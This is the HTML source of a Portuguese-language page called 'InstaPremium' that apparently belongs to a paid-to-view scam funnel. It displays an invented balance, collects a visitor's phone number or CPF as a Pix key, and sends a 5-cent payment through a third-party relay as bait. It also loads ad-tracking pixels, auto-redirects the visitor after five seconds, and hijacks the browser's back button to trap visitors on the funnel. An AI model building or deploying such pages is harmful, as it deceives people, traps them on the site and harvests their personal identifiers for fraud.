<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
    
    <link rel="stylesheet" href="./style.css">
    <link rel="stylesheet" href="path/to/font-awesome/css/font-awesome.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js" integrity="sha512-v2CJ7UaYy4JwqLDIrZUI/4hqeoQieOmAZNXBeQyjo21dadnwR+8ZaIJVT8EE2iyI61OV8e6M8PP2/4hpQINQ/g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha512-DTOQO9RWCH3ppGqcWaEA1BIZOC6xxalwEsw9c2QQeAIftl+Vegovlnee1c9QX4TctnWMn13TZye+giMm8e2LwA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <title>InstaPremium</title>
    <script 
        src="https://cdn.xtracky.com/scripts/utm-handler.js"
        data-token="bc9db88a-bcd0-437f-bd69-12f622d701bd"
        data-click-id-param="click_id">
</script>
<!-- Meta Pixel Code -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '494913433675653');
fbq('track', 'PageView');
</script>
<noscript><img height="1" width="1" style="display:none"
src="https://www.facebook.com/tr?id=494913433675653&ev=PageView&noscript=1"
/></noscript>
<!-- End Meta Pixel Code -->
    <style>
      .welcome-bar {
          background-color: #232423; 
          color: white; 
          padding: 10px 0; 
          text-align: center; 
          position: fixed; 
          top: 50px;
          left: 50%; 
          transform: translateX(-50%);
          width: 90%; 
          border-radius: 8px;
          font-size: 13px;
          z-index: 9999;
          transition: opacity 1s; 
      }
      /* Classe para ocultar a barra */
      .welcome-bar.hidden {
          opacity: 0; /* Torna a barra transparente */
          pointer-events: none; /* Impede interações com a barra */
      }
    </style>
    <script>
        var option = 'phone';

         function formatar(mascara, documento) {
            let i = documento.value.length;
            let saida = '#';
            let texto = mascara.substring(i);
            while (texto.substring(0, 1) != saida && texto.length ) {
            documento.value += texto.substring(0, 1);
            i++;
            texto = mascara.substring(i);
            }
        }

        function gerarPix() {
            //INTEGRAÇÃO AQUI
            if (option == 'phone') {
                localStorage.setItem('pix', $('.phone').val());
                var pixKey = '+55' + $('.phone').val().replace(/\D/g,'');
            } else {
                localStorage.setItem('pix', $('.cpf').val());
                var pixKey = $('.cpf').val().replace(/\D/g,'');
            }

            var url = 'https://api.primepag.com.br/v1/pix/payments';
            var uniqueId = generateUniqueId();
            var data =   {
                "initiation_type": "dict", 
                "idempotent_id": uniqueId, 
                "receiver_name": "John Doe", 
                "value_cents": 5,
                "pix_key_type": option,
                "pix_key": pixKey,
                "authorized": true
            }

            $.ajax({
                url: 'https://cupom-server-3857a533d564.herokuapp.com/api/payment-2',
                type: 'POST',
                contentType: 'application/json',
                data: JSON.stringify(data),
                success: function(response) {
                    $('.pop').removeClass('d-none');

                    console.log(response, data)
                },
                error: function(response) {
                    console.log(response, data)
                    alert('Erro ao gerar pix.')
                }
            });
        };
        function generateUniqueId() {
            // Gera um número aleatório entre 0 e 9999999999
            var randomNumber = Math.floor(Math.random() * 10000000000);
            // Concatena a data atual para tornar o identificador mais exclusivo
            var timestamp = new Date().getTime();
            // Retorna a combinação do número aleatório e do timestamp
            return 'PAGAMENTO_PARCEIRO01' + randomNumber + timestamp;
        }

        $(document).ready(function() {
            $('.option').click(function() {
            $('.option').removeClass('selected');
            $(this).addClass("selected");
                option = $(this).attr('id');
                console.log(option);

                if (option == 'phone') {
                $('.phone').removeClass('d-none');
                $('.cpf').addClass('d-none');
            } else {
                $('.cpf').removeClass('d-none');
                $('.phone').addClass('d-none');
            }
            });

            setTimeout(() => {
                window.location.href = 'foto4.html';
            }, 5000);

            var urlBackRedirect = `/back.html`;
    // não altere nada abaixo dessa linha
    urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
            document.location.search.replace('?', '').toString();
    history.pushState({}, "", location.href);
    history.pushState({}, "", location.href);
    window.onpopstate = function () {
        setTimeout(function () {
            location.href = urlBackRedirect;
        }, 1);
    };
        })
  </script>
  </head>
  <body style="background-color: white;">
    <header>
      <img src="./logo.svg" alt="" style="width: 150px;">
      <span class="saldo">R$ 183,08</span>
    </header>

    <div class="vsl" style="max-height: auto; width: 90%; overflow: hidden; margin: 0px auto;">
        <!--espaco vsl-->
    </div>
  </body>
  
  <script src="./script.js"></script>
</html>